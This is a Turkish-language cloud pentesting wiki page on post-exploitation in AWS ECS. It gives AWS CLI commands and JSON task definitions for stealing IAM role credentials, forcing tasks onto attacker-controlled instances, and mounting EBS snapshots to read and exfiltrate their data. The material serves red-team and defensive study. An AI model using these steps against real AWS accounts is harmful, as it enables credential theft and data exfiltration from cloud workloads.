# AWS - ECS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### Host IAM Rolleri

ECS'te konteyner içinde çalışan göreve bir IAM role atanabilir. Eğer görev bir EC2 instance içinde çalıştırılıyorsa, EC2 instance'ına başka bir IAM rolü eklenmiş olur.  
Bu da, bir ECS instance'ını **compromise** edebilirseniz, potansiyel olarak ECR ve EC2 instance'ına bağlı IAM rolünü elde edebileceğiniz anlamına gelir. Bu kimlik bilgilerini nasıl alacağınıza dair daha fazla bilgi için bakınız:

{{#ref}}
https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html
{{#endref}}

> [!CAUTION]
> IMDSv2'nin hop limitini 1 olarak belirlemek, awsvpc veya host-networked görevleri **engellemez** — sadece Docker bridge görevleri cevapların yok olması için yeterince uzakta oturur. Tam saldırı iş akışı ve bypass notları için [ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation](../aws-ec2-ebs-ssm-and-vpc-post-exploitation/README.md#ecs-on-ec2-imds-abuse--ecs-agent-impersonation) bölümüne bakın. Yakın tarihli [Latacora research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/) awsvpc ve host görevlerinin IMDSv2+h=1 uygulanmış olsa bile host kimlik bilgilerini hâlâ çektiğini gösteriyor.

### Privesc to node to steal other containers creds & secrets

Ayrıca, EC2 docker kullanarak ECS task'larını çalıştırır; bu yüzden node'a kaçabilir veya **docker socket'e erişebilirseniz**, hangi **diğer container'ların** çalıştığını **görebilir**, hatta onların içine girip üzerlerine bağlı IAM rollerini **çalabilirsiniz**.

#### Mevcut host'ta container'ları çalıştırma

Dahası, **EC2 instance role** genellikle kümedeki node olarak kullanılan EC2 instance'larının **container instance state**ini **güncellemek** için yeterli **permissions**a sahiptir. Bir saldırgan bir instance'ın **state'ini DRAINING olarak değiştirebilir**, ardından ECS o instance'daki tüm görevleri **kaldırır** ve **REPLICA** olarak çalıştırılanlar **farklı bir instance'da çalıştırılır**, potansiyel olarak saldırganın instance'ında, böylece onların IAM rollerini ve container içindeki hassas bilgileri **çalabilir**.
```bash
aws ecs update-container-instances-state \
--cluster <cluster> --status DRAINING --container-instances <container-instance-id>
```
Aynı teknik, **EC2 instance'ını cluster'dan deregister ederek** yapılabilir. Bu muhtemelen daha az gizli olur ama **görevlerin diğer instance'larda çalıştırılmasını zorlayacaktır:**
```bash
aws ecs deregister-container-instance \
--cluster <cluster> --container-instance <container-instance-id> --force
```
Görevlerin yeniden çalıştırılmasını zorlamak için son bir teknik, ECS'ye **task or container was stopped** olduğunu bildirmektir. Bunu yapmak için 3 olası API vardır:
```bash
# Needs: ecs:SubmitTaskStateChange
aws ecs submit-task-state-change --cluster <value> \
--status STOPPED --reason "anything" --containers [...]

# Needs: ecs:SubmitContainerStateChange
aws ecs submit-container-state-change ...

# Needs: ecs:SubmitAttachmentStateChanges
aws ecs submit-attachment-state-changes ...
```
### Steal sensitive info from ECR containers

EC2 instance muhtemelen ayrıca `ecr:GetAuthorizationToken` iznine sahiptir; bu da **imajları indirmesine** izin verir (içlerinde hassas bilgi arayabilirsiniz).



### Mount an EBS snapshot directly in an ECS task (configuredAtLaunch + volumeConfigurations)

Yeni bir ECS task/service içinde mevcut bir EBS snapshot'ının içeriğini doğrudan mount etmek ve container içinden verilerini okumak için native ECS EBS entegrasyonunu (2024+) kötüye kullanın.

- Gerekenler (asgari):
- ecs:RegisterTaskDefinition
- Bunlardan biri: ecs:RunTask OR ecs:CreateService/ecs:UpdateService
- iam:PassRole için:
- Volümler için kullanılan ECS altyapı rolü (policy: `service-role/AmazonECSInfrastructureRolePolicyForVolumes`)
- Task execution/Task rolleri (task definition tarafından referans edilenler)
- Eğer snapshot bir CMK ile şifrelenmişse: infra rol için KMS izinleri (yukarıdaki AWS managed policy, AWS managed keys için gerekli KMS yetkilerini içerir).

- Etki: Snapshot'tan rastgele disk içeriğini (ör. veritabanı dosyaları) container içinde okuyup ağ/loglar aracılığıyla exfiltrate etmek.

Adımlar (Fargate örneği):

1) ECS altyapı rolünü oluşturun (yoksa) ve managed policy'yi iliştirin:
```bash
aws iam create-role --role-name ecsInfrastructureRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsInfrastructureRole \
--policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSInfrastructureRolePolicyForVolumes
```
2) `configuredAtLaunch` olarak işaretlenmiş bir volume içeren bir task definition kaydedin ve bunu container'a mount edin. Örnek (secret'i yazdırıp sonra uyur):
```json
{
"family": "ht-ebs-read",
"networkMode": "awsvpc",
"requiresCompatibilities": ["FARGATE"],
"cpu": "256",
"memory": "512",
"executionRoleArn": "arn:aws:iam::<ACCOUNT_ID>:role/ecsTaskExecutionRole",
"containerDefinitions": [
{"name":"reader","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["cat /loot/secret.txt || true; sleep 3600"],
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/ebs","awslogs-stream-prefix":"reader"}},
"mountPoints":[{"sourceVolume":"loot","containerPath":"/loot","readOnly":true}]
}
],
"volumes": [ {"name":"loot", "configuredAtLaunch": true} ]
}
```
3) EBS snapshot'ını `volumeConfigurations.managedEBSVolume` aracılığıyla geçirerek bir service oluşturun veya güncelleyin (infra role üzerinde iam:PassRole gerektirir). Örnek:
```json
{
"cluster": "ht-ecs-ebs",
"serviceName": "ht-ebs-svc",
"taskDefinition": "ht-ebs-read",
"desiredCount": 1,
"launchType": "FARGATE",
"networkConfiguration": {"awsvpcConfiguration":{"assignPublicIp":"ENABLED","subnets":["subnet-xxxxxxxx"],"securityGroups":["sg-xxxxxxxx"]}},
"volumeConfigurations": [
{"name":"loot","managedEBSVolume": {"roleArn":"arn:aws:iam::<ACCOUNT_ID>:role/ecsInfrastructureRole", "snapshotId":"snap-xxxxxxxx", "filesystemType":"ext4"}}
]
}
```
4) Görev başladığında, konteyner yapılandırılmış bağlama yolundaki snapshot içeriğini (örn. `/loot`) okuyabilir. Exfiltrate via the task’s network/logs.

Temizlik:
```bash
aws ecs update-service --cluster ht-ecs-ebs --service ht-ebs-svc --desired-count 0
aws ecs delete-service --cluster ht-ecs-ebs --service ht-ebs-svc --force
aws ecs deregister-task-definition ht-ebs-read
```
## Referanslar

- [Latacora - ECS on EC2: Covering Gaps in IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)

{{#include ../../../../banners/hacktricks-training.md}}
